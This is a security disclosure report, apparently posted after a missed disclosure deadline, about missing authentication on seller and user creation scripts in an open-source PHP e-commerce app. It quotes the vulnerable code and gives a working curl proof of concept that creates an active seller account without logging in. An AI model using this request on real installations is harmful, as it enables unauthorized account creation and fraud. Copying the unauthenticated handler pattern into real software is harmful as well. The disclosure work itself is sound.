## Executive Summary

A comprehensive security assessment was performed on the local instance of the E-commerce application. The assessment identified **four Critical and High-severity vulnerabilities** stemming from systemic flaws in input validation, session management, and access control implementation. Thois is mere one from others.

**Disclosure Timeline Update:**

* **December 16, 2025:** Initial contact attempted via email and this GitHub issue.
* **December 23, 2025:** Disclosure deadline passed. No response received from the maintainer.
* **December 26, 2025:** Proceeding with full disclosure in accordance with standard responsible disclosure guidelines to warn the community.


### **Disclosure Reference**

The issues detailed in these repositories were reported to the project maintainers in accordance with responsible disclosure practices. Full technical details are being released following the expiration of the disclosure deadline without response.

**Official Bug Report:** [GitHub Issue #23: Multiple Critical Vulnerabilities](https://github.com/detronetdip/E-commerce/issues/23)

---


## Vulnerability 3: Broken Access Control (Unauthenticated Account Creation)

**Severity:** **CRITICAL** (9.8)
**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
**Bug Type:** CWE-306: Missing Authentication for Critical Function

### Description

The backend scripts responsible for creating new User and Seller accounts completely lack authentication or authorization checks. These files are directly accessible via HTTP requests (`Admin/assets/backend/...`).

The application architecture assumes that users will only access these files via the Admin Dashboard UI, which is protected by a login page. However, the backend processing scripts themselves do not verify if the request was initiated by an authenticated administrator. This allows an unauthenticated external attacker to create valid User and Seller accounts, bypassing any frontend approval workflows or registration closures.

### Vulnerable Files

* `Admin/assets/backend/seller/add_seller.php`
* `Admin/assets/backend/user/add_user.php`

### Vulnerable Code Analysis

**File:** `Admin/assets/backend/seller/add_seller.php`

```php
require('../../../../utility/utility.php');

// FLAW: No session_start() is called to resume a session.
// FLAW: No check is performed to verify if $_SESSION['ADMIN_ID'] is set.
// The code proceeds directly to database insertion.

$email=get_safe_value($con,$_POST['email']);
$password=password_hash($pass, PASSWORD_DEFAULT);

// The attacker-supplied data is inserted directly into the 'sellers' table.
mysqli_query($con,"insert into sellers (password,mobile,email,status,is_new) values ('$password','$mobile','$email','1','1')");
echo 1;

```

### Exploit Proof of Concept (PoC)

**Exploit Command:**
The attacker sends a direct POST request to the backend file to create a seller account with the status "Active" (1).

```bash
curl -X POST \
  -d "email=attacker@evil.com" \
  -d "pass=password123" \
  -d "mobile=0000000000" \
  "http://localhost:3000/Admin/assets/backend/seller/add_seller.php"

```

**Output:**

```text
1

```

### Impact

* **Authorization Bypass:** Attackers can create accounts even if public registration is disabled.
* **Privilege Escalation:** By creating a "Seller" account, the attacker gains access to the seller dashboard, which is a prerequisite for exploiting other vulnerabilities (such as the IDORs mentioned above).
* **Spam/Fraud:** Attackers can flood the database with fake accounts, degrading database performance and complicating user management.
